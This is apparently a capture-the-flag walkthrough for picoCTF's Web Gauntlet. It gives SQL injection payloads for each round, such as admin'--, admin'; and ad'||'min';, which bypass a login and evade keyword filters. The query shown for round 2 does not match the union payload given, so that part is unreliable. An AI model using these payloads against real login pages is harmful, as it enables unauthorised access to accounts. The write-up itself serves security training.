**Challenges Difficulty: Medium**
**Category: Web Exploitation**


## Introduction
This series focus on the fundamentals of SQL Injection vulnerability <a href = "https://owasp.org/www-community/attacks/SQL_Injection" target = "_blank" >A03:2021-Injectionicon</a>
## WALKTHROUGH
This challenges is from picoCTF 2020 Mini-Competition 
#### Hints:
1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite
5. If your cookie keeps getting reset, try using a private browser window
![Challenge 1](/assets/img/posts/post-1/chal.png )
The challenge gives us 2 links as showen above the first on is a login page and the second showes us what the round filters 
for the first round it filters out the **or** so we can still use **--** to comment the rest of the query 
---
username: admin'--
password: anything ex:123
then the query should look like this:
---
```
SELECT * FROM users WHERE username='admin'-- AND password='123'
```
---
now we are in round 2 and it filters out the following **or and like = --**
we shall try to use alternative method like union to continue
---
username: admin'union select * from users where '1;
password: anything ex:123
then the query should look like this:
---
```
SELECT * FROM users WHERE username='admin'; AND password='123'
```
---

in round 3 it filters **or and = like > < --** we can still comment using **;**  

---
username: admin';
password: anything ex:123
then the query should look like this:
---
```
SELECT * FROM users WHERE username='admin'; AND password='123'
```
---
round 4 is a little bit creative as it filters out **or and = like > < -- admin** admin??ðŸ™‚ dont panic no problemðŸ˜…
In SQL, the || operator is commonly used for string concatenation, especially in databases like Oracle and PostgreSQL. If the applicationâ€™s underlying SQL query uses this operator correctly, entering ad'||'min' would result in the following behavior:

'''
SELECT * FROM users WHERE username = 'admin';
'''
and this is what we want 
---
username: ad'||'min';
password: anything ex:123
then the query should look like this:
---
```
SELECT * FROM users WHERE username='admin'; AND password='123'
```
---
we are in the final round good jop âœŒ
in the final round it filters **and = like > < -- union admin** and yes we will use the same method like the past round
---
username: ad'||'min';
password: anything ex:123
then the query should look like this:
---
```
SELECT * FROM users WHERE username='admin'; AND password='123'
```
